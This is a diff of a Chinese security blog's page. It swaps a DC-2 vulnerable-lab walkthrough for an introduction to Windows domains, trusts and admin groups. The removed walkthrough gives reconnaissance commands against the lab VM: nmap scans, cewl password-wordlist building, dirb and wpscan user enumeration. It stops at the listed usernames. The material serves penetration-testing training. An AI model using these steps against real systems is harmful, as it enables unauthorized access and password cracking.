@@ -1,19 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DC-2靶场记录">
-<title>DC-2</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="域的讲解">
+<title>域</title>
 
 <link rel='canonical' href='https://dxlaboratory.github.io/p/test-chinese/'>
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="DC-2">
-<meta property='og:description' content="DC-2靶场记录">
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="域">
+<meta property='og:description' content="域的讲解">
 <meta property='og:url' content='https://dxlaboratory.github.io/p/test-chinese/'>
-<meta property='og:site_name' content='鼎星安全'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-10-31T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-10-31T00:00:00&#43;00:00'/><meta property='og:image' content='https://dxlaboratory.github.io/20241104083955.jpg' />
-<meta name="twitter:title" content="DC-2">
-<meta name="twitter:description" content="DC-2靶场记录"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://dxlaboratory.github.io/20241104083955.jpg' />
+<meta property='og:site_name' content='鼎新安全'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-10-31T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-10-31T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="域">
+<meta name="twitter:description" content="域的讲解">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -59,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu1759709287013950866.png" width="300"
+                        <img src="/img/avatar_hu15989093696106354798.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -72,8 +71,8 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">鼎星安全</a></h1>
-            <h2 class="site-description">欢迎来到鼎星实验室</h2>
+            <h1 class="site-name"><a href="/">鼎新安全</a></h1>
+            <h2 class="site-description">欢迎来到鼎新实验室</h2>
         </div>
     </header><ol class="menu-social">
             
@@ -291,19 +290,20 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#下载链接">下载链接：</a></li>
-    <li><a href="#vmware环境配置">VMware环境配置</a></li>
-  </ol>
-
-  <ol>
-    <li><a href="#一信息收集">一、信息收集</a></li>
-    <li><a href="#flag1">flag1</a></li>
-    <li><a href="#二渗透阶段">二、渗透阶段</a></li>
-    <li><a href="#flag2">flag2</a></li>
-    <li><a href="#flag3">flag3</a></li>
-    <li><a href="#flag4">flag4</a></li>
-    <li><a href="#flag5">flag5</a></li>
-    <li><a href="#三提权">三、提权</a></li>
+    <li>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#域介绍">域介绍</a></li>
+            <li><a href="#域信任关系">域信任关系</a></li>
+            <li><a href="#什么是信任关系">什么是信任关系</a></li>
+            <li><a href="#内外部信任关系">内外部信任关系</a></li>
+            <li><a href="#域内用户">域内用户</a></li>
+            <li><a href="#域内用户组介绍">域内用户组介绍</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -315,23 +315,15 @@
 
 
             <main class="main full-width">
-    <article class="has-image main-article">
+    <article class="main-article">
     <header class="article-header">
-        <div class="article-image">
-            <a href="/p/test-chinese/">
-                
-                    <img src="/20241104083955.jpg" loading="lazy" alt="Featured image of post DC-2" />
-                
-            </a>
-        </div>
-    
 
     <div class="article-details">
     
     <header class="article-category">
         
-            <a href="/categories/%E9%9D%B6%E5%9C%BA/" >
-                靶场
+            <a href="/categories/%E6%96%87%E7%AB%A0/" >
+                文章
             </a>
         
     </header>
@@ -339,12 +331,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/test-chinese/">DC-2</a>
+            <a href="/p/test-chinese/">域</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            DC-2靶场记录
+            域的讲解
         </h3>
         
     </div>
@@ -380,7 +372,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 5 分钟
                 </time>
             </div>
         
@@ -395,434 +387,557 @@
     <section class="article-content">
     
     
-    <h1 id="前言">前言
-</h1><hr>
-<blockquote>
-<p>与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。
-与最初的 DC-1 一样，它的设计考虑到了初学者。
-必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。
-就像 DC-1 一样，有五个标志，包括最后一个标志。
-再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。
-简而言之，唯一真正重要的标志是最后一面旗帜。
-对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。
-我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。</p>
-</blockquote>
-<p>[TOC]</p>
-<h1 id="实验环境">实验环境：
-</h1><h2 id="下载链接">下载链接：
-</h2><p><a class="link" href="https://www.vulnhub.com/entry/dc-1,292/"  target="_blank" rel="noopener"
-    >https://www.vulnhub.com/entry/dc-1,292/</a><br>
-（下载慢，放到迅雷里面）</p>
-<h2 id="vmware环境配置">VMware环境配置
-</h2><p>必须是NAT模式，且攻击机也是NAT模式</p>
-<p><img src="/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png"
-	width="1105"
-	height="271"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, /p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w"
+    <p>+++</p>
+<h4 id="域介绍">域介绍
+</h4><h5 id="什么是域">什么是域
+</h5><p>它是一个有安全边界的计算机集合，一个域中的用户无法访问另一个域中的资源。用户想要进入域和进入域内后想要访问什么资源也要有对应的权限
+<img src="/p/test-chinese/index.assets/image-20241104230004919.png"
+	width="1008"
+	height="375"
+	srcset="/p/test-chinese/index.assets/image-20241104230004919_hu2058729316143551820.png 480w, /p/test-chinese/index.assets/image-20241104230004919_hu10851564931915001587.png 1024w"
 	loading="lazy"
 	
-		alt="1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47"
+		alt="image-20241104230004919"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="407"
-		data-flex-basis="978px"
+		data-flex-grow="268"
+		data-flex-basis="645px"
 	
 ></p>
-<h1 id="攻击步骤">攻击步骤
-</h1><h2 id="一信息收集">一、信息收集
-</h2><p>查看自己的IP地址，使用nmap进行同网段扫描</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ifconfig
-</span></span><span class="line"><span class="cl">ip:192.168.26.128
-</span></span><span class="line"><span class="cl">nmap -sP 192.168.26.128/24
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>目标IP：192.168.26.129</p>
-<p>扫描该IP端口及服务</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -p- -sV 192.168.26.129
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>结果</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT
-</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.26.129
-</span></span><span class="line"><span class="cl">Host is up (0.00062s latency).
-</span></span><span class="line"><span class="cl">Not shown: 65533 closed tcp ports (reset)
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
-</span></span><span class="line"><span class="cl">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
-</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:F4:BE:15 (VMware)
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>一个http的80端口，一个7744的ssh服务</p>
-<p>如果访问打不开网站的话，说明网站被重定向了</p>
-<p>添加一下主机就行了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /etc/hosts
-</span></span><span class="line"><span class="cl">192.168.26.129 dc-2
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="flag1">flag1
-</h2><p>打开页面发现flag标志</p>
-<p><img src="/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png"
-	width="994"
-	height="574"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, /p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w"
+<p>工作组就相当于在大学，域相当于在高中，工作组可以随机进入，没有统一管理用户。域不可以随意进入，并且存在统一管理用户
+<img src="/p/test-chinese/index.assets/image-20241104230014356.png"
+	width="1012"
+	height="430"
+	srcset="/p/test-chinese/index.assets/image-20241104230014356_hu5895055432159851483.png 480w, /p/test-chinese/index.assets/image-20241104230014356_hu13474538388785004099.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230014356"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="564px"
+	
+></p>
+<h5 id="单域和多域">单域和多域
+</h5><p>在一个域内，一般至少要用两台域服务器，一台作为DC，一台作为备份DC
+<img src="/p/test-chinese/index.assets/image-20241104230024928.png"
+	width="1012"
+	height="498"
+	srcset="/p/test-chinese/index.assets/image-20241104230024928_hu4603765982461503469.png 480w, /p/test-chinese/index.assets/image-20241104230024928_hu9335165716908657089.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230024928"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+>
+在多个域中，需要每个域都有自己的DC
+<img src="/p/test-chinese/index.assets/image-20241104230035993.png"
+	width="1009"
+	height="724"
+	srcset="/p/test-chinese/index.assets/image-20241104230035993_hu10305703898917627968.png 480w, /p/test-chinese/index.assets/image-20241104230035993_hu13162477012507652314.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230035993"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="334px"
+	
+></p>
+<h5 id="父域和子域">父域和子域
+</h5><p>一般来说在多个域中，第一个域称为父域，各分部的域称为该域的子域
+域名一般为xxx.xxx。而子域的为xxx.xxx.xx.例：父域为：abc.com,那么子域一般为sec.abc.com,yunwei.abc.com这种</p>
+<h5 id="域树和域森林">域树和域森林
+</h5><h6 id="域树">域树
+</h6><p>域树是多个域通过建立信任关系组合的继集成。两个域之间想要互相访问需要建立信任关系。
+（或者说由一个父域和多个子域组成的关系组叫做域树）
+<img src="/p/test-chinese/index.assets/image-20241104230056489.png"
+	width="1013"
+	height="495"
+	srcset="/p/test-chinese/index.assets/image-20241104230056489_hu1281380786261922879.png 480w, /p/test-chinese/index.assets/image-20241104230056489_hu505892576423765871.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230056489"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="491px"
+	
+></p>
+<h6 id="域森林">域森林
+</h6><p>多个域树通过建立信任关系组合成的集合。
+<img src="/p/test-chinese/index.assets/image-20241104230232021.png"
+	width="1014"
+	height="538"
+	srcset="/p/test-chinese/index.assets/image-20241104230232021_hu15766742695333057516.png 480w, /p/test-chinese/index.assets/image-20241104230232021_hu11793734157342799525.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230232021"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="452px"
+	
+>
+比如说一家公司兼并了另一家公司，自家公司的域树为abc.com,兼并的公司域树为abc.net，那么abc.net无法挂在域abc.com下。那么它们两个就需要建立信任关系达到链接的目的。</p>
+<h6 id="dc域控">DC域控
+</h6><p>一般来说，一个域里面至少要有两台域服务器，一个DC（域控服务器），一个备份DC
+![image-20241104230120068](三、域.assets/image-20241104230120068.png<img src="/p/test-chinese/index.assets/image-20241104230241906.png"
+	width="883"
+	height="618"
+	srcset="/p/test-chinese/index.assets/image-20241104230241906_hu12451678834308265854.png 480w, /p/test-chinese/index.assets/image-20241104230241906_hu11486064157033723080.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230241906"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+>
+一般来说， 进入域环境中优先拿下DC服务器。</p>
+<h6 id="域环境搭建">域环境搭建
+</h6><ol>
+<li>搭建域的网络环境</li>
+<li>DC机器搭建</li>
+<li>域内主机搭建</li>
+<li>加入域和退出域</li>
+</ol>
+<p>准备一台DC虚拟机，两台正常用户机
+在vm虚拟机上设置DC的IP（192.168.41.0）网关（192.168.41.2）并且设置net模式。
+vm配置
+<img src="/p/test-chinese/index.assets/image-20241104230313308.png"
+	width="1006"
+	height="875"
+	srcset="/p/test-chinese/index.assets/image-20241104230313308_hu5122531976855993818.png 480w, /p/test-chinese/index.assets/image-20241104230313308_hu6675607220764557474.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230313308"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="114"
+		data-flex-basis="275px"
+	
+>
+<img src="/p/test-chinese/index.assets/image-20241104230323835.png"
+	width="1007"
+	height="918"
+	srcset="/p/test-chinese/index.assets/image-20241104230323835_hu12348525019891251919.png 480w, /p/test-chinese/index.assets/image-20241104230323835_hu473248453888359821.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230323835"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="263px"
+	
+>
+DC本机配置
+<img src="/p/test-chinese/index.assets/image-20241104230334021.png"
+	width="1008"
+	height="1024"
+	srcset="/p/test-chinese/index.assets/image-20241104230334021_hu2814761957728520573.png 480w, /p/test-chinese/index.assets/image-20241104230334021_hu16736853261129760585.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230334021"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="98"
+		data-flex-basis="236px"
+	
+>
+<img src="/p/test-chinese/index.assets/image-20241104230347165.png"
+	width="1016"
+	height="833"
+	srcset="/p/test-chinese/index.assets/image-20241104230347165_hu172029425482292920.png 480w, /p/test-chinese/index.assets/image-20241104230347165_hu12898056020863827454.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230347165"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+>
+在服务器管理器内&mdash;-&gt; 添加角色和功能&mdash;-&gt;前面三个默认，服务器角色选择域服务与DNS服务&mdash;-&gt;剩余全部下一步（如果密码过于简单，在安装过程中可能会报错）
+<img src="/p/test-chinese/index.assets/image-20241104230419629.png"
+	width="1010"
+	height="714"
+	srcset="/p/test-chinese/index.assets/image-20241104230419629_hu12819833228918969557.png 480w, /p/test-chinese/index.assets/image-20241104230419629_hu7165135424639075932.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230419629"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="339px"
+	
+>
+将DC升级为域控制服务器。(设置密码，域名称等)
+<img src="/p/test-chinese/index.assets/image-20241104230429313.png"
+	width="1003"
+	height="609"
+	srcset="/p/test-chinese/index.assets/image-20241104230429313_hu8189685808167542291.png 480w, /p/test-chinese/index.assets/image-20241104230429313_hu9894551442144633343.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230429313"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+></p>
+<h6 id="域内主机搭建">域内主机搭建
+</h6><p>windows7
+<img src="/p/test-chinese/index.assets/image-20241104230445998.png"
+	width="659"
+	height="715"
+	srcset="/p/test-chinese/index.assets/image-20241104230445998_hu5784769464885963496.png 480w, /p/test-chinese/index.assets/image-20241104230445998_hu11123868945199883274.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230445998"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="221px"
+	
+>搭建成功的话可以ping的通
+<img src="/p/test-chinese/index.assets/image-20241104230455619.png"
+	width="959"
+	height="418"
+	srcset="/p/test-chinese/index.assets/image-20241104230455619_hu133515987475427370.png 480w, /p/test-chinese/index.assets/image-20241104230455619_hu8939624616468818182.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230455619"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="550px"
+	
+>
+加入和退出域
+在vm内，域内主机都要设置为net模式
+加入域
+管理工具 &mdash;-&gt; AD用户和计算机
+<img src="/p/test-chinese/index.assets/image-20241104230504829.png"
+	width="1006"
+	height="742"
+	srcset="/p/test-chinese/index.assets/image-20241104230504829_hu13558041965408351784.png 480w, /p/test-chinese/index.assets/image-20241104230504829_hu10060367614239704066.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230504829"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="135"
+		data-flex-basis="325px"
+	
+>
+<img src="/p/test-chinese/index.assets/image-20241104230512618.png"
+	width="1007"
+	height="696"
+	srcset="/p/test-chinese/index.assets/image-20241104230512618_hu1723184680307362466.png 480w, /p/test-chinese/index.assets/image-20241104230512618_hu5986208632533487212.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230512618"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="347px"
+	
+>
+添加了一个域用户，在另一台还未加入域环境的主机，加入域环境
+<img src="/p/test-chinese/index.assets/image-20241104230525091.png"
+	width="1012"
+	height="698"
+	srcset="/p/test-chinese/index.assets/image-20241104230525091_hu4386369867213110233.png 480w, /p/test-chinese/index.assets/image-20241104230525091_hu10862441980005373463.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230525091"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="347px"
+	
+>
+返回域内机器，设置&mdash;&gt;关于&mdash;-&gt;重命名此电脑&mdash;&gt;更改
+<img src="/p/test-chinese/index.assets/image-20241104230538709.png"
+	width="1014"
+	height="736"
+	srcset="/p/test-chinese/index.assets/image-20241104230538709_hu6708021092672011886.png 480w, /p/test-chinese/index.assets/image-20241104230538709_hu15598936562574140431.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230538709"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="330px"
+	
+>
+<img src="/p/test-chinese/index.assets/image-20241104230550035.png"
+	width="695"
+	height="835"
+	srcset="/p/test-chinese/index.assets/image-20241104230550035_hu3869424436288057664.png 480w, /p/test-chinese/index.assets/image-20241104230550035_hu12306650159114007571.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230550035"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="83"
+		data-flex-basis="199px"
+	
+>
+退出域将隶属于改为工作组就可以了（需要提供域管理员的用户名和密码)</p>
+<h4 id="域信任关系">域信任关系
+</h4><h4 id="什么是信任关系">什么是信任关系
+</h4><p>域就像一个边界，域内的用户账户只能在域本域内使用，而信任关系就像是在两个域之间搭建一座桥，让域用户可以跨域使用
+<img src="/p/test-chinese/index.assets/image-20241104230704454.png"
+	width="1051"
+	height="418"
+	srcset="/p/test-chinese/index.assets/image-20241104230704454_hu11865668908156750333.png 480w, /p/test-chinese/index.assets/image-20241104230704454_hu11215095389321550393.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230704454"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+>
+<img src="/p/test-chinese/index.assets/image-20241104230712630.png"
+	width="1062"
+	height="817"
+	srcset="/p/test-chinese/index.assets/image-20241104230712630_hu4142214386640440989.png 480w, /p/test-chinese/index.assets/image-20241104230712630_hu9515011924502186793.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230712630"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="311px"
+	
+></p>
+<h4 id="内外部信任关系">内外部信任关系
+</h4><h5 id="内部信任">内部信任
+</h5><p>内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在域树中的所有域都是双向信任关系，在创建一个新的子域时，系统会在新的子域和父域之间自动创建双向信任关系。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/test-chinese/index.assets/image-20241104230802851.png"
+	width="1036"
+	height="780"
+	srcset="/p/test-chinese/index.assets/image-20241104230802851_hu1499386912983484323.png 480w, /p/test-chinese/index.assets/image-20241104230802851_hu4748220833374945771.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230802851"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<h5 id="外部信任关系"><strong>外部信任关系</strong>
+</h5><p>外部信任关系是指不同域之间的信任关系，这种一般是单向或双向不可传递的
+<img src="/p/test-chinese/index.assets/image-20241105085604139.png"
+	width="1260"
+	height="565"
+	srcset="/p/test-chinese/index.assets/image-20241105085604139_hu13564142330379077676.png 480w, /p/test-chinese/index.assets/image-20241105085604139_hu15357168423443965815.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241105085604139"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="535px"
+	
+>
+A域与B域之间建立外部信任关系，但是A域没有与B域的子域不存在信任关系。</p>
+<h4 id="域内用户">域内用户
+</h4><h4 id="域内用户组介绍">域内用户组介绍
+</h4><p>电脑加入到域，使用域内的用户进行登录。域内存用户的信息放在域控（DC）上， 添加用户或修改密码都在域控上执行。
+<img src="/p/test-chinese/index.assets/image-20241104230818989.png"
+	width="1017"
+	height="586"
+	srcset="/p/test-chinese/index.assets/image-20241104230818989_hu14683152367306681328.png 480w, /p/test-chinese/index.assets/image-20241104230818989_hu11052859578206117654.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230818989"
 	
 	
 		class="gallery-image" 
 		data-flex-grow="173"
-		data-flex-basis="415px"
+		data-flex-basis="416px"
 	
 ></p>
-<p>意思：</p>
-<p>让我们找会员的登录密码，登录一个人后给下一个flag</p>
-<h2 id="二渗透阶段">二、渗透阶段
-</h2><h2 id="flag2">flag2
-</h2><p>cewl介绍:</p>
-<p>是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。</p>
-<p>扒一下网站，看看有什么</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cewl http://dc-2 -w passwd.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png"
-	width="348"
-	height="577"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, /p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w"
+<h6 id="domain-admins组">Domain Admins组
+</h6><p>在域控主机中的Domain Admins（域管理员组）中的用户，拥有完整的管理员权限。该组内的所有用户都会添加到每台域成员的Domain Admins中。这样就可以获取域中所有计算机的所有权
+<img src="/p/test-chinese/index.assets/image-20241104230828963.png"
+	width="903"
+	height="553"
+	srcset="/p/test-chinese/index.assets/image-20241104230828963_hu12124609352260938371.png 480w, /p/test-chinese/index.assets/image-20241104230828963_hu4083573219465214334.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230828963"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="60"
-		data-flex-basis="144px"
+		data-flex-grow="163"
+		data-flex-basis="391px"
 	
 ></p>
-<p>再扫描一下目录</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dirb http://dc-2 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png"
-	width="607"
-	height="177"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, /p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w"
+<h6 id="administrators组">Administrators组
+</h6><p>如果添加到位置是在域控的Administrators组中，那么添加的账号只是域控这台主机的管理员权限，并不是所有域成员机器的管理员权限。
+<img src="/p/test-chinese/index.assets/image-20241104230838100.png"
+	width="906"
+	height="691"
+	srcset="/p/test-chinese/index.assets/image-20241104230838100_hu14305372676259537440.png 480w, /p/test-chinese/index.assets/image-20241104230838100_hu1028161646783038708.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230838100"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="342"
-		data-flex-basis="823px"
+		data-flex-grow="131"
+		data-flex-basis="314px"
 	
 ></p>
-<p>扫描到登录界面</p>
-<p><img src="/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png"
-	width="532"
-	height="480"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, /p/test-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w"
+<h6 id="enterprise-admins组">Enterprise Admins组
+</h6><p>Enterprise Admins（企业系统管理员组）是域森林或根域中的一个组。这个组在域森林中的每个域内都是Administrators组的成员。对所有==域控制器都要完全访问权限==
+<img src="/p/test-chinese/index.assets/image-20241104230847156.png"
+	width="1014"
+	height="223"
+	srcset="/p/test-chinese/index.assets/image-20241104230847156_hu5663005707482081703.png 480w, /p/test-chinese/index.assets/image-20241104230847156_hu1458773367403066704.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230847156"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="110"
-		data-flex-basis="266px"
+		data-flex-grow="454"
+		data-flex-basis="1091px"
 	
 ></p>
-<p>有密码了，现在只要枚举一下用户名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wpscan --url http://dc-2/ -e u      //枚举用户名字
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>枚举出来的用户名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin
-</span></span><span class="line"><span class="cl">tom
-</span></span><span class="line"><span class="cl">jerry
